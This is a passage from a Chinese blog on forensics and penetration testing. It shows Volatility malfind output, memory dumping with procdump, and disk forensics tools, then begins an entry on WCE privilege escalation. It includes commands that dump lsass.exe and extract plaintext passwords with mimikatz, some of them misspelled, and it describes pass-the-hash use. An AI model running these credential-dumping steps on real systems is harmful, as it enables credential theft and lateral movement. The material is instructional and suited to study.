0x77fe0000    0x11000     0xffff                                C:\WINDOWS\system32\Secur32.dll</span><br><span class="line">    0x5cb70000    0x26000        0x1                                C:\WINDOWS\system32\ShimEng.dll</span><br><span class="line">    0x6f880000   0x1ca000        0x1                                C:\WINDOWS\AppPatch\AcGenral.DLL</span><br><span class="line">    0x7e410000    0x91000       0x41                                C:\WINDOWS\system32\USER32.dll</span><br><span class="line">    0x77f10000    0x49000       0x36                                C:\WINDOWS\system32\GDI32.dll</span><br><span class="line">    0x76b40000    0x2d000        0x2                                C:\WINDOWS\system32\WINMM.dll</span><br><span class="line">    0x774e0000   0x13d000        0xe                                C:\WINDOWS\system32\ole32.dll</span><br><span class="line">    0x77c10000    0x58000       0x53                                C:\WINDOWS\system32\msvcrt.dll</span><br><span class="line">    0x77120000    0x8b000        0x7                                C:\WINDOWS\system32\OLEAUT32.dll</span><br><span class="line">    0x77be0000    0x15000        0x1                                C:\WINDOWS\system32\MSACM32.dll</span><br><span class="line">    0x77c00000     0x8000        0x3                                C:\WINDOWS\system32\VERSION.dll</span><br><span class="line">    0x7c9c0000   0x817000        0x3                                C:\WINDOWS\system32\SHELL32.dll</span><br><span class="line">    0x77f60000    0x76000        0x7                                C:\WINDOWS\system32\SHLWAPI.dll</span><br><span class="line">    0x769c0000    0xb4000        0x1                                C:\WINDOWS\system32\USERENV.dll</span><br><span class="line">    0x5ad70000    0x38000        0x1                                C:\WINDOWS\system32\UxTheme.dll</span><br><span class="line">    0x773d0000   0x103000        0x2                                C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\comctl32.dll</span><br><span class="line">    0x5d090000    0x9a000        0x1                                C:\WINDOWS\system32\comctl32.dll</span><br><span class="line">    0x77690000    0x21000        0x1                                C:\WINDOWS\system32\NTMARTA.DLL</span><br><span class="line">    0x71bf0000    0x13000        0x1                                C:\WINDOWS\system32\SAMLIB.dll</span><br><span class="line">    0x76f60000    0x2c000        0x1                                C:\WINDOWS\system32\WLDAP32.dll</span><br><span class="line">    0x00630000   0x2c5000        0x1                                C:\WINDOWS\system32\xpsp2res.dll</span><br><span class="line">    0x74c40000     0x6000        0x1                                c:\windows\system32\lmhsvc.dll</span><br><span class="line">    0x76d60000    0x19000        0x2                                c:\windows\system32\iphlpapi.dll</span><br><span class="line">    0x71ab0000    0x17000       0x24                                c:\windows\system32\WS2_32.dll</span><br><span class="line">    0x71aa0000     0x8000       0x25                                c:\windows\system32\WS2HELP.dll</span><br><span class="line">    0x5a6e0000    0x15000        0x1                                c:\windows\system32\webclnt.dll</span><br><span class="line">    0x771b0000    0xaa000        0x1                                C:\WINDOWS\system32\WININET.dll</span><br><span class="line">    0x77a80000    0x95000        0x1                                C:\WINDOWS\system32\CRYPT32.dll</span><br><span class="line">    0x77b20000    0x12000        0x1                                C:\WINDOWS\system32\MSASN1.dll</span><br><span class="line">    0x71ad0000     0x9000        0x1                                C:\WINDOWS\system32\wsock32.dll</span><br><span class="line">    0x76af0000    0x12000        0x1                                c:\windows\system32\regsvc.dll</span><br><span class="line">    0x765e0000    0x14000        0x1                                c:\windows\system32\ssdpsrv.dll</span><br><span class="line">    0x662b0000    0x58000        0x3                                C:\WINDOWS\system32\hnetcfg.dll</span><br><span class="line">    0x76fd0000    0x7f000        0x2                                C:\WINDOWS\system32\CLBCATQ.DLL</span><br><span class="line">    0x77050000    0xc5000        0x2                                C:\WINDOWS\system32\COMRes.dll</span><br><span class="line">    0x71a50000    0x3f000        0x2                                C:\WINDOWS\system32\mswsock.dll</span><br><span class="line">    0x71a90000     0x8000        0x1                                C:\WINDOWS\System32\wshtcpip.dll</span><br></pre></td></tr></table></figure>
<p>对比知，1060调用的DLL远超过了1200，1128进程（本应差不多），1060进程"可能"已被感染</p>
<h4
id="利用自身插件malfind检测可疑进程">（6）利用自身插件malfind检测可疑进程</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># vol.py -f XP_SP3-20230121-111153.raw --profile=WinXPSP3x86 malfind -p 1060,1200,1128 -D Temp </span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Process: svchost.exe Pid: 1060 Address: 0x14e0000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 32, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x00000000014e0000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............</span><br><span class="line">0x00000000014e0010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......</span><br><span class="line">0x00000000014e0020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x00000000014e0030  00 00 00 00 00 00 00 00 00 00 00 00 f0 00 00 00   ................</span><br><span class="line"></span><br><span class="line">0x00000000014e0000 4d               DEC EBP</span><br><span class="line">0x00000000014e0001 5a               POP EDX</span><br><span class="line">0x00000000014e0002 90               NOP</span><br><span class="line">0x00000000014e0003 0003             ADD [EBX], AL</span><br><span class="line">0x00000000014e0005 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0007 000400           ADD [EAX+EAX], AL</span><br><span class="line">0x00000000014e000a 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e000c ff               DB 0xff</span><br><span class="line">0x00000000014e000d ff00             INC DWORD [EAX]</span><br><span class="line">0x00000000014e000f 00b800000000     ADD [EAX+0x0], BH</span><br><span class="line">0x00000000014e0015 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0017 004000           ADD [EAX+0x0], AL</span><br><span class="line">0x00000000014e001a 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e001c 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e001e 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0020 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0022 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0024 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0026 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0028 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e002a 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e002c 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e002e 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0030 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0032 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0034 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0036 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e0038 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e003a 0000             ADD [EAX], AL</span><br><span class="line">0x00000000014e003c f00000           LOCK ADD [EAX], AL</span><br><span class="line">0x00000000014e003f 00               DB 0x0</span><br><span class="line"></span><br><span class="line">Process: svchost.exe Pid: 1060 Address: 0x1990000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 43, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x0000000001990000  4d 5a e8 00 00 00 00 5b 52 45 55 89 e5 81 c3 56   MZ.....[REU....V</span><br><span class="line">0x0000000001990010  45 00 00 ff d3 81 c3 a3 62 02 00 89 3b 53 6a 04   E.......b...;Sj.</span><br><span class="line">0x0000000001990020  50 ff d0 00 00 00 00 00 00 00 00 00 00 00 00 00   P...............</span><br><span class="line">0x0000000001990030  00 00 00 00 00 00 00 00 00 00 00 00 f0 00 00 00   ................</span><br><span class="line"></span><br><span class="line">0x0000000001990000 4d               DEC EBP</span><br><span class="line">0x0000000001990001 5a               POP EDX</span><br><span class="line">0x0000000001990002 e800000000       CALL 0x1990007</span><br><span class="line">0x0000000001990007 5b               POP EBX</span><br><span class="line">0x0000000001990008 52               PUSH EDX</span><br><span class="line">0x0000000001990009 45               INC EBP</span><br><span class="line">0x000000000199000a 55               PUSH EBP</span><br><span class="line">0x000000000199000b 89e5             MOV EBP, ESP</span><br><span class="line">0x000000000199000d 81c356450000     ADD EBX, 0x4556</span><br><span class="line">0x0000000001990013 ffd3             CALL EBX</span><br><span class="line">0x0000000001990015 81c3a3620200     ADD EBX, 0x262a3</span><br><span class="line">0x000000000199001b 893b             MOV [EBX], EDI</span><br><span class="line">0x000000000199001d 53               PUSH EBX</span><br><span class="line">0x000000000199001e 6a04             PUSH 0x4</span><br><span class="line">0x0000000001990020 50               PUSH EAX</span><br><span class="line">0x0000000001990021 ffd0             CALL EAX</span><br><span class="line">0x0000000001990023 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001990025 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001990027 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001990029 0000             ADD [EAX], AL</span><br><span class="line">0x000000000199002b 0000             ADD [EAX], AL</span><br><span class="line">0x000000000199002d 0000             ADD [EAX], AL</span><br><span class="line">0x000000000199002f 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001990031 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001990033 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001990035 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001990037 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001990039 0000             ADD [EAX], AL</span><br><span class="line">0x000000000199003b 00f0             ADD AL, DH</span><br><span class="line">0x000000000199003d 0000             ADD [EAX], AL</span><br><span class="line">0x000000000199003f 00               DB 0x0</span><br><span class="line"></span><br><span class="line">Process: svchost.exe Pid: 1060 Address: 0x1a50000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 49, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x0000000001a50000  4d 5a e8 00 00 00 00 5b 52 45 55 89 e5 81 c3 56   MZ.....[REU....V</span><br><span class="line">0x0000000001a50010  45 00 00 ff d3 81 c3 a3 62 02 00 89 3b 53 6a 04   E.......b...;Sj.</span><br><span class="line">0x0000000001a50020  50 ff d0 00 00 00 00 00 00 00 00 00 00 00 00 00   P...............</span><br><span class="line">0x0000000001a50030  00 00 00 00 00 00 00 00 00 00 00 00 f0 00 00 00   ................</span><br><span class="line"></span><br><span class="line">0x0000000001a50000 4d               DEC EBP</span><br><span class="line">0x0000000001a50001 5a               POP EDX</span><br><span class="line">0x0000000001a50002 e800000000       CALL 0x1a50007</span><br><span class="line">0x0000000001a50007 5b               POP EBX</span><br><span class="line">0x0000000001a50008 52               PUSH EDX</span><br><span class="line">0x0000000001a50009 45               INC EBP</span><br><span class="line">0x0000000001a5000a 55               PUSH EBP</span><br><span class="line">0x0000000001a5000b 89e5             MOV EBP, ESP</span><br><span class="line">0x0000000001a5000d 81c356450000     ADD EBX, 0x4556</span><br><span class="line">0x0000000001a50013 ffd3             CALL EBX</span><br><span class="line">0x0000000001a50015 81c3a3620200     ADD EBX, 0x262a3</span><br><span class="line">0x0000000001a5001b 893b             MOV [EBX], EDI</span><br><span class="line">0x0000000001a5001d 53               PUSH EBX</span><br><span class="line">0x0000000001a5001e 6a04             PUSH 0x4</span><br><span class="line">0x0000000001a50020 50               PUSH EAX</span><br><span class="line">0x0000000001a50021 ffd0             CALL EAX</span><br><span class="line">0x0000000001a50023 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a50025 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a50027 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a50029 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a5002b 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a5002d 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a5002f 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a50031 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a50033 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a50035 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a50037 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a50039 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a5003b 00f0             ADD AL, DH</span><br><span class="line">0x0000000001a5003d 0000             ADD [EAX], AL</span><br><span class="line">0x0000000001a5003f 00               DB 0x0</span><br><span class="line"></span><br><span class="line">Process: svchost.exe Pid: 1060 Address: 0x2430000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 95, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x0000000002430000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............</span><br><span class="line">0x0000000002430010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......</span><br><span class="line">0x0000000002430020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x0000000002430030  00 00 00 00 00 00 00 00 00 00 00 00 f8 00 00 00   ................</span><br><span class="line"></span><br><span class="line">0x0000000002430000 4d               DEC EBP</span><br><span class="line">0x0000000002430001 5a               POP EDX</span><br><span class="line">0x0000000002430002 90               NOP</span><br><span class="line">0x0000000002430003 0003             ADD [EBX], AL</span><br><span class="line">0x0000000002430005 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430007 000400           ADD [EAX+EAX], AL</span><br><span class="line">0x000000000243000a 0000             ADD [EAX], AL</span><br><span class="line">0x000000000243000c ff               DB 0xff</span><br><span class="line">0x000000000243000d ff00             INC DWORD [EAX]</span><br><span class="line">0x000000000243000f 00b800000000     ADD [EAX+0x0], BH</span><br><span class="line">0x0000000002430015 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430017 004000           ADD [EAX+0x0], AL</span><br><span class="line">0x000000000243001a 0000             ADD [EAX], AL</span><br><span class="line">0x000000000243001c 0000             ADD [EAX], AL</span><br><span class="line">0x000000000243001e 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430020 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430022 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430024 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430026 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430028 0000             ADD [EAX], AL</span><br><span class="line">0x000000000243002a 0000             ADD [EAX], AL</span><br><span class="line">0x000000000243002c 0000             ADD [EAX], AL</span><br><span class="line">0x000000000243002e 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430030 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430032 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430034 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430036 0000             ADD [EAX], AL</span><br><span class="line">0x0000000002430038 0000             ADD [EAX], AL</span><br><span class="line">0x000000000243003a 0000             ADD [EAX], AL</span><br><span class="line">0x000000000243003c f8               CLC</span><br><span class="line">0x000000000243003d 0000             ADD [EAX], AL</span><br><span class="line">0x000000000243003f 00               DB 0x0</span><br><span class="line"></span><br><span class="line">Process: svchost.exe Pid: 1060 Address: 0x5350000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 4113, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x0000000005350000  c8 00 00 00 4a 01 00 00 ff ee ff ee 00 10 04 00   ....J...........</span><br><span class="line">0x0000000005350010  00 00 00 00 00 fe 00 00 00 00 10 00 00 20 00 00   ................</span><br><span class="line">0x0000000005350020  00 02 00 00 00 20 00 00 30 21 20 00 ff ef fd 7f   ........0!......</span><br><span class="line">0x0000000005350030  1c 00 08 06 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line"></span><br><span class="line">0x0000000005350000 c8000000         ENTER 0x0, 0x0</span><br><span class="line">0x0000000005350004 4a               DEC EDX</span><br><span class="line">0x0000000005350005 0100             ADD [EAX], EAX</span><br><span class="line">0x0000000005350007 00ff             ADD BH, BH</span><br><span class="line">0x0000000005350009 ee               OUT DX, AL</span><br><span class="line">0x000000000535000a ff               DB 0xff</span><br><span class="line">0x000000000535000b ee               OUT DX, AL</span><br><span class="line">0x000000000535000c 0010             ADD [EAX], DL</span><br><span class="line">0x000000000535000e 0400             ADD AL, 0x0</span><br><span class="line">0x0000000005350010 0000             ADD [EAX], AL</span><br><span class="line">0x0000000005350012 0000             ADD [EAX], AL</span><br><span class="line">0x0000000005350014 00fe             ADD DH, BH</span><br><span class="line">0x0000000005350016 0000             ADD [EAX], AL</span><br><span class="line">0x0000000005350018 0000             ADD [EAX], AL</span><br><span class="line">0x000000000535001a 1000             ADC [EAX], AL</span><br><span class="line">0x000000000535001c 0020             ADD [EAX], AH</span><br><span class="line">0x000000000535001e 0000             ADD [EAX], AL</span><br><span class="line">0x0000000005350020 0002             ADD [EDX], AL</span><br><span class="line">0x0000000005350022 0000             ADD [EAX], AL</span><br><span class="line">0x0000000005350024 0020             ADD [EAX], AH</span><br><span class="line">0x0000000005350026 0000             ADD [EAX], AL</span><br><span class="line">0x0000000005350028 3021             XOR [ECX], AH</span><br><span class="line">0x000000000535002a 2000             AND [EAX], AL</span><br><span class="line">0x000000000535002c ff               DB 0xff</span><br><span class="line">0x000000000535002d ef               OUT DX, EAX</span><br><span class="line">0x000000000535002e fd               STD</span><br><span class="line">0x000000000535002f 7f1c             JG 0x535004d</span><br><span class="line">0x0000000005350031 0008             ADD [EAX], CL</span><br><span class="line">0x0000000005350033 06               PUSH ES</span><br><span class="line">0x0000000005350034 0000             ADD [EAX], AL</span><br><span class="line">0x0000000005350036 0000             ADD [EAX], AL</span><br><span class="line">0x0000000005350038 0000             ADD [EAX], AL</span><br><span class="line">0x000000000535003a 0000             ADD [EAX], AL</span><br><span class="line">0x000000000535003c 0000             ADD [EAX], AL</span><br><span class="line">0x000000000535003e 0000             ADD [EAX], AL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>只发现1060进程是可疑的。</p>
<h4
id="利用查毒软件在线查杀网站检测dump下来的进程">（7）利用查毒软件|在线查杀网站检测dump下来的进程</h4>
<p>刚拖到主机，火绒就查杀了。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230122103616697-1357903639.png" /></p>
<p>virustotal.com的检测结果</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230122104207637-44105691.png" /></p>
<p><strong>综上：1060进程已被感染！</strong></p>
<h3
id="内存取证发现恶意软件的示例镜像">5、内存取证发现恶意软件的示例镜像</h3>
<p><strong>Volatility开发者提供可直接下载下来分析</strong></p>
<ul>
<li><a
href="https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples"
class="uri">https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples</a></li>
<li><a
href="https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki"
class="uri">https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki</a></li>
</ul>
<h2 id="活取证">5. 活取证</h2>
<h3 id="从内存还原文字">1、从内存还原文字</h3>
<p>procdump程序：<a
href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx"
class="uri">https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx</a></p>
<p>strings程序windows版：&lt;https://technet.microsoft.com/en-
us/sysinternals/bb897439.aspx&gt;</p>
<p>procdump -ma xxx.exe xxx.dmp
#将某一个进程的所有相关文件保存下来，m内存，a-&gt;all</p>
<p>strings只能查看英文字符查看连续三个以上的ascii字符，适用于很多种文件(word、excel、powerpoint)，或者是将邮件进程dump下来然后进行读取就能查看内容，也就是说适用于各种文字处理工具</p>
<p>可能存在某些文字记录程序中包含了用户的账户密码，就可以dump内存查看</p>
<p>strings xxx.dmp &gt; xxx.txt(使用查找工具查找文件中包含的文字)</p>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125160431965-160375234.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125160504589-1681714137.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125160659010-171920655.png" /></p>
<h3 id="从内存还原图片">2、从内存还原图片</h3>
<p>画图截屏进行图片操作的时候dump内存内容中应该是含有图片的数据的，那能不能使用方法还原图片
(可以一定程度上进行还原、并不能原模原样还原)截图之后进行保存然后使用画图工具进行编辑、进程中就有画图进程
<code>procdump -ma mspaint.exe mspaint.dmp</code>将内存保存为dmp文件</p>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125161547722-290899844.png" /></p>
<p>远程桌面连接使用远程桌面尝试连接一台机器远程连接的所有操作都是在被操作的机器上产生的，其所做的只是把操作的图像传回自己的机器，那么有图像信息或许就可以使用工具将图像进行还原产生一个新的进程mstsc.exe。</p>
<p>在kali中使用gimp（相当于Windows下的PS软件，需自行安装）还原</p>
<p>安装gimp：apt-get install gimp（建议用代理快点）</p>
<p>将mspaint.dmp后缀变为data，接着用gimp打开调参还原。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> mspaint.dmp mspaint.data</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125171305896-1893303976.png" /></p>
<p>左边是原图，右侧是gimp调出来的，几乎不能百分百还原，但能看个大概。</p>
<h3 id="从内存还原明文密码">3、从内存还原明文密码</h3>
<p>存放密码相关的进程叫做lsass.exe进程，每台windows电脑上都有，system权限，该进程存放windows明文密码。</p>
<p>procdump -ma lsass.exe lsass.dmp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekularlsa::minidump lsass.dmp</span><br><span class="line">sekular::logonPasswords</span><br></pre></td></tr></table></figure>
<p><strong>示例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125162235449-1133919221.png" /></p>
<p><strong>注意，以管理员身份打开cmd，否则lsass.exe打不开。</strong></p>
<p><strong>利用mimikatz提取明文密码</strong>
（mimikatz具体用法参见提权部分的介绍）</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125163736231-1118765297.png" /></p>
<p>利用DumpIt + volatility外部插件mimikatz提取明文密码（<a
href="https://github.com/cofarmer/volatility_mimikatz/blob/master/mimikatz.py"
class="uri">https://github.com/cofarmer/volatility_mimikatz/blob/master/mimikatz.py</a>）</p>
<p>将mimikatz.py复制到/usr/local/lib/python2.7/dist-packages/volatility/plugins目录下</p>
<pre><code>vol.py -f WIN7-Z9M8R8-1-20230125-140115.raw --profile=Win7SP1x64 mimikatz</code></pre>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125222323281-742178026.png" /></p>
<p><strong>可能的报错</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">Failed to import volatility.plugins.mimikatz (ImportError: No module named construct)</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
<p>使用 pip2 install construct 安装即可，若pip2安装报错，则先去<a
href="https://pypi.tuna.tsinghua.edu.cn/simple/construct/"
class="uri">https://pypi.tuna.tsinghua.edu.cn/simple/construct/</a>将包下载下来，再安装（如图）。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125213053331-1732134741.png" /></p>
<h2 id="死取证">6. 死取证</h2>
<h3 id="硬盘镜像">1、硬盘镜像</h3>
<p>使用kali光盘启动目标计算机，用工具给机器硬盘做一个镜像，镜像文件需要有一个足够大的空间来储存，u盘或者外挂硬盘</p>
<p>镜像制作工具</p>
<ul>
<li>Dc3dd（命令行）</li>
<li>Dcfldd（命令行）</li>
<li>guymager（图形界面）</li>
</ul>
<p><strong>guymager演示</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230125230558677-1609530875.png" /></p>
<p>计算机取证技术参考数据集合（电子取证镜像文件）：<a
href="https://cfreds.nist.gov/all/DFIR_AB/ForensicsImageTestimage"
class="uri">https://cfreds.nist.gov/all/DFIR_AB/ForensicsImageTestimage</a>或<a
href="https://dftt.sourceforge.net/"
class="uri">https://dftt.sourceforge.net/</a></p>
<h3 id="取证工具-1">2、取证工具</h3>
<h4 id="dff-digital-forensics-framework">（1）DFF （Digital Forensics
Framework）</h4>
<ul>
<li>Open Evidence # 红色表示已经删除的文件</li>
<li>发现恢复已经删除和隐藏的文件</li>
<li>kali已弃用，老版本kali可正常使用</li>
<li>想动手实践的推荐参考：<a
href="https://github.com/apachecn/apachecn-kali-zh/blob/master/docs/digifore-kali/10.md"
class="uri">https://github.com/apachecn/apachecn-kali-zh/blob/master/docs/digifore-kali/10.md</a></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230126153510568-621449779.png" /></p>
<h4 id="autopsy推荐">（2）Autopsy（推荐）</h4>
<p>webserver+浏览器客户端架构</p>
<p><strong>注意：</strong> 导入内容与模式</p>
<ul>
<li>Disk(整个硬盘)</li>
<li>Partition(硬盘分区)</li>
<li>move：将整个镜像文件加载到autopsy中成为evidence
locker(证据locker，被写入的文件无法再被更改)，如果过程中突然断电可能对文件造成损坏</li>
<li>copy（建议）：复制一份然后加载到autopsy中</li>
<li>symlink：链接模式，如果源文件移动可能发生错误</li>
</ul>
<p><strong>Autopsy中文使用教程（用户版）：</strong><a
href="https://www.wangan.com/docs/autopsy"
class="uri">https://www.wangan.com/docs/autopsy</a></p>
<p><strong>Autopsy分析示例：</strong><a
href="https://juejin.cn/post/6844903791095971847"
class="uri">https://juejin.cn/post/6844903791095971847</a></p>
<h4 id="extundelete">（3）Extundelete</h4>
<p>适用于ext3、ext4文件系统的反删除工具</p>
<p>Extundelete [device -file] -restore-file [restore location]</p>
<p>关于ext系统：多用于linux下的一种日志型文件系统，如果在其中删除了文件，可以还原对应文件</p>
<p>使用方法是 Extundelete 设备名(例如/dev/sda) -restore-file
恢复文件路径</p>
<h4 id="iphone-backup-analyzer">（4）iPhone Backup Analyzer</h4>
<p>能分析iTunes生成的iPhone手机备份文件、并非image文件</p>
<h4 id="foremost美国政府开发">（5）Foremost(美国政府开发)</h4>
<p>从内存dump中恢复文档图片(并不是图像，而是原来就存在磁盘中某个位置中的某个图片加载进内存)，支持raw、dd(硬盘镜像格式)、iso(光盘镜像格式)、vmem(虚拟内存格式)、doc等格式。</p>
<p>kali需要自己重新安装一下这个程序</p>
<p>使用命令：foremost -t jpeg,gif,png,doc -i xx.raw</p>
<p>处理完成之后会在当前目录下生成一个output文件夹
在该文件夹内存放着提取到的所有图片文件，以及一个对所有文件详细信息进行描述的txt文档</p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foremost  -t jpeg,gif,png,doc -i WIN7-Z9M8R8-1-20230125-140115.raw </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20230126110215923-192194361.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>电子取证</category>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>电子取证</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之提权：利用相关工具提权</title>
    <url>/2022/02/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%8F%90%E6%9D%83%EF%BC%9A%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="windows身份认证过程">1. WINDOWS身份认证过程</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214183649360-1402844854.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214183705993-1804744301.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220214183722335-1848117876.png" /></p>
<p><strong>账户在登陆的目标服务器/系统后，系统中 </strong>WDisgest
<strong>安全包会在内存中维护当前处于登录状态账户明文的密码，当注销登陆后才会被删除。
</strong></p>
<h2 id="wce-windows-credential-editor">2. WCE (WINDOWS CREDENTIAL
EDITOR</h2>
<p>Windows Credentials Editor
(WCE)（windows凭证信息编辑器）是一款功能强大的windows平台内网渗透工具。</p>
<p><strong>作用</strong></p>
<p>它可以列举登陆会话，并且可以添加、改变和删除相关凭据（例如：LM/NT
hashes）。这些功能在内网渗透中能够被利用，例如，在windows平台上执行绕过hash或者从内存中获取NT/LM
hashes（也可以从交互式登陆、服务、远程桌面连接中获取）以用于进一步的攻击。可以查看系统当前登陆用户的登陆密码的密文形式和明文形式。</p>
<p><strong>要求</strong></p>
<p>使用需具有管理员权限</p>
